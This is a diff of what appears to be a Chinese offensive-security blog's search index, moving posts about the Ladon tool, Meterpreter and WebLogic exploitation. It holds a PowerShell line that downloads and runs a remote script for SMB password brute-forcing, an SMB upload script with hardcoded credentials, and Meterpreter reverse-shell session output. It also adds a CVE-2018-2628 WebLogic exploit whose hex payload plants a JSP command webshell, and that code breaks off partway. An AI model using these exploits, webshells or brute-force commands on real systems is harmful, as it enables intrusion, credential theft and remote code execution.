@@ -1061,7 +1061,7 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <h3 id="139端口"><a href="#139端口" class="headerlink" title="139端口"></a>139端口</h3><p>NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows”文件和打印机共享”和SAMBA。</p>
 <h3 id="IPC-通信"><a href="#IPC-通信" class="headerlink" title="IPC$通信"></a>IPC$通信</h3><p>Windows系统中的net use ipc$整个通信过程，先445-&gt;137-&gt;139验证，当你开启防火墙禁用445，发现系统命令就无法连接IPC了，根本没机会走到139，所以使用系统自带命令连接的ipc$需要同时开启这些端口。说入侵139就是IPC$的说法是错误的，就像说wmiexec.vbs可完全替代PSEXEC工具一样，这个脚本需要目标开启135和445，因为它通过445来传输结果，意味着目标只开放135这个VBS的回显就没有了，其实假设目标只开放445，这个VBS脚本还能执行命令吗？哪来的替代或扔掉？这个系统的IPC$连接也是同理，测试首先得把其它端口禁了再说话。虽然系统自带命令需要同时开启，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的，详情参考impacket。</p>
 <h3 id="Nbt爆破"><a href="#Nbt爆破" class="headerlink" title="Nbt爆破"></a>Nbt爆破</h3><p>系统自带命令需要同时开启139和445，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的。系统的IPC$就像读取系统密码一样，可以先植入CS再用MIMI插件读取，但是我们也可以不使用CS，直接MIMI读取密码啊。基于和MIMI可以独立读取密码的原理，反向思路我们也可以完全不走445，直接通过139验证WINDOWS密码，所以这个和IPC$不一样(指的是系统命令连接的ipc)，所以为了防止大家误解，起名为NbtScan。毕竟走的也是Netbios，系统IPC$验证一是时间非常久，且必须开启445，如果445都开了为何不用SmbScan验证密码呢？但是由于近几年勒索病毒横行，可能很多机器默认会关闭445，所以会导致无法通过445验证密码，但是没关系还有139啊。</p>
-<h3 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h3><h5 id="139端口-Netbios密码爆破-Windows"><a href="#139端口-Netbios密码爆破-Windows" class="headerlink" title="139端口 Netbios密码爆破(Windows)"></a>139端口 Netbios密码爆破(Windows)</h5><p>Ladon 192.168.1.8/24 NbtScan<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/NbtScan.PNG"></p>
+<h3 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h3><h4 id="139端口-Netbios密码爆破-Windows"><a href="#139端口-Netbios密码爆破-Windows" class="headerlink" title="139端口 Netbios密码爆破(Windows)"></a>139端口 Netbios密码爆破(Windows)</h4><p>Ladon 192.168.1.8/24 NbtScan<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/NbtScan.PNG"></p>
 <h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载NbtScan-139端口弱口令爆破"><a href="#远程加载NbtScan-139端口弱口令爆破" class="headerlink" title="远程加载NbtScan 139端口弱口令爆破"></a>远程加载NbtScan 139端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon7.1_all.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon7.1_all.ps1&#39;</a>); Ladon 192.168.1.141 NbtScan”</p>
 <h3 id="139传输文件"><a href="#139传输文件" class="headerlink" title="139传输文件"></a>139传输文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> smb.SMBConnection <span class="keyword">import</span> SMBConnection</span><br><span class="line"><span class="keyword">from</span> nmb.NetBIOS <span class="keyword">import</span> NetBIOS</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBIOSName</span><span class="params">(remote_smb_ip, timeout=<span class="number">30</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bios = NetBIOS()</span><br><span class="line">        srv_name = bios.queryIPForName(remote_smb_ip, timeout=timeout)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">"Looking up timeout, check remote_smb_ip again!!"</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        bios.close()</span><br><span class="line">        <span class="keyword">return</span> srv_name</span><br><span class="line">serverip=<span class="string">'192.168.1.40'</span></span><br><span class="line">conn = SMBConnection(<span class="string">'k8gege'</span>, <span class="string">'k8gege520'</span>, <span class="string">'C$'</span>,getBIOSName(serverip)[<span class="number">0</span>], use_ntlm_v2 = <span class="literal">True</span>) </span><br><span class="line"><span class="keyword">assert</span> conn.connect(serverip, <span class="number">139</span>)</span><br><span class="line"><span class="comment">#temdir='/'</span></span><br><span class="line"><span class="comment">#dir=os.path.join('/','public')</span></span><br><span class="line">f = open(<span class="string">'C:/123.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">conn.storeFile(<span class="string">'Users'</span>,<span class="string">'234.txt'</span>,f)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
 
@@ -1294,8 +1294,8 @@ window.location.href="http://k8gege.org/Ladon/WinrmScan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>密码爆破</category>
         <category>远程执行</category>
+        <category>密码爆破</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1341,10 +1341,10 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>CS: <a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Cobalt Strike</category>
-        <category>内网渗透</category>
+        <category>Ladon</category>
         <category>远程执行</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -1683,8 +1683,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>主机发现</category>
         <category>内网渗透</category>
+        <category>主机发现</category>
         <category>信息收集</category>
       </categories>
       <tags>
@@ -1707,9 +1707,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
-        <category>密码</category>
         <category>Kali</category>
+        <category>密码</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1888,8 +1888,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>工具</category>
-        <category>Ladon</category>
         <category>Kali</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1938,8 +1938,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Cobalt Strike</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -2031,47 +2031,6 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit/PowerShell内存加载执行.NET</title>
-    <url>/p/57438.html</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，<br>且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p>
-<h3 id="0x001-C-DLL"><a href="#0x001-C-DLL" class="headerlink" title="0x001 C# DLL"></a>0x001 C# DLL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace msftest</span><br><span class="line">&#123;</span><br><span class="line">    public class msf</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run()</span><br><span class="line">        &#123;</span><br><span class="line">            return &quot;msftest by k8gege&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x002-PowerShell"><a href="#0x002-PowerShell" class="headerlink" title="0x002 PowerShell"></a>0x002 PowerShell</h3><p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line">---    -------        --------</span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x003-MSF加载-NET"><a href="#0x003-MSF加载-NET" class="headerlink" title="0x003 MSF加载.NET"></a>0x003 MSF加载.NET</h3><p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x004-关于兼容性"><a href="#0x004-关于兼容性" class="headerlink" title="0x004 关于兼容性"></a>0x004 关于兼容性</h3><p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗?</p>
-<p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p>
-<p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p>
-<p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p>
-<p>如下所示，有时通过系统PowerShell加载ex一样报错<br>PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>所在位置 行:1 字符: 32</p>
-<ul>
-<li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)<ul>
-<li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li>
-<li>FullyQualifiedErrorId : DotNetMethodException</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x005-结论"><a href="#0x005-结论" class="headerlink" title="0x005 结论"></a>0x005 结论</h3><p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p>
-<p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>
-]]></content>
-      <categories>
-        <category>Metasploit</category>
-        <category>.NET</category>
-        <category>PowerShell</category>
-      </categories>
-      <tags>
-        <tag>Metasploit</tag>
-        <tag>PowerShell</tag>
-        <tag>.NET</tag>
-        <tag>C#</tag>
-        <tag>MSF</tag>
-        <tag>meterpreter</tag>
       </tags>
   </entry>
   <entry>
@@ -2178,8 +2137,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
 ]]></content>
       <categories>
         <category>工具</category>
-        <category>Ladon</category>
         <category>密码</category>
+        <category>Ladon</category>
         <category>嗅探</category>
       </categories>
       <tags>
@@ -2190,6 +2149,47 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <tag>HttpSniffer</tag>
         <tag>IIS</tag>
         <tag>LDAP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Metasploit/PowerShell内存加载执行.NET</title>
+    <url>/p/57438.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，<br>且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p>
+<h3 id="0x001-C-DLL"><a href="#0x001-C-DLL" class="headerlink" title="0x001 C# DLL"></a>0x001 C# DLL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace msftest</span><br><span class="line">&#123;</span><br><span class="line">    public class msf</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run()</span><br><span class="line">        &#123;</span><br><span class="line">            return &quot;msftest by k8gege&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x002-PowerShell"><a href="#0x002-PowerShell" class="headerlink" title="0x002 PowerShell"></a>0x002 PowerShell</h3><p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line">---    -------        --------</span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x003-MSF加载-NET"><a href="#0x003-MSF加载-NET" class="headerlink" title="0x003 MSF加载.NET"></a>0x003 MSF加载.NET</h3><p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x004-关于兼容性"><a href="#0x004-关于兼容性" class="headerlink" title="0x004 关于兼容性"></a>0x004 关于兼容性</h3><p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗?</p>
+<p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p>
+<p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p>
+<p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p>
+<p>如下所示，有时通过系统PowerShell加载ex一样报错<br>PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>所在位置 行:1 字符: 32</p>
+<ul>
+<li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)<ul>
+<li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li>
+<li>FullyQualifiedErrorId : DotNetMethodException</li>
+</ul>
+</li>
+</ul>
+<h3 id="0x005-结论"><a href="#0x005-结论" class="headerlink" title="0x005 结论"></a>0x005 结论</h3><p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p>
+<p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>
+]]></content>
+      <categories>
+        <category>Metasploit</category>
+        <category>.NET</category>
+        <category>PowerShell</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+        <tag>PowerShell</tag>
+        <tag>.NET</tag>
+        <tag>C#</tag>
+        <tag>MSF</tag>
+        <tag>meterpreter</tag>
       </tags>
   </entry>
   <entry>
@@ -2282,11 +2282,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
+        <category>内网渗透</category>
         <category>源码</category>
         <category>主机发现</category>
-        <category>内网渗透</category>
-        <category>编程</category>
         <category>信息收集</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -2341,8 +2341,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
 <h3 id="0x006-执行效果"><a href="#0x006-执行效果" class="headerlink" title="0x006 执行效果"></a>0x006 执行效果</h3><p><img alt="image" data-original="http://k8gege.org/k8img/Other/ilcode.PNG"></p>
 ]]></content>
       <categories>
-        <category>ShellCode</category>
         <category>.NET</category>
+        <category>ShellCode</category>
         <category>源码</category>
         <category>编程</category>
       </categories>
@@ -2909,8 +2909,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
 ]]></content>
       <categories>
         <category>工具</category>
-        <category>Ladon</category>
         <category>Kali</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -3012,6 +3012,55 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       </tags>
   </entry>
   <entry>
+    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
+    <url>/p/b8e58f69.html</url>
+    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
+<hr>
+<ul>
+<li>漏洞威胁：RCE--远程代码执行</li>
+<li>漏洞组件：weblogic</li>
+<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
+</ul>
+<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
+# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
+
+<p>from <strong>future</strong> import print_function</p>
+<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
+<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
+<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
+return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
+<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 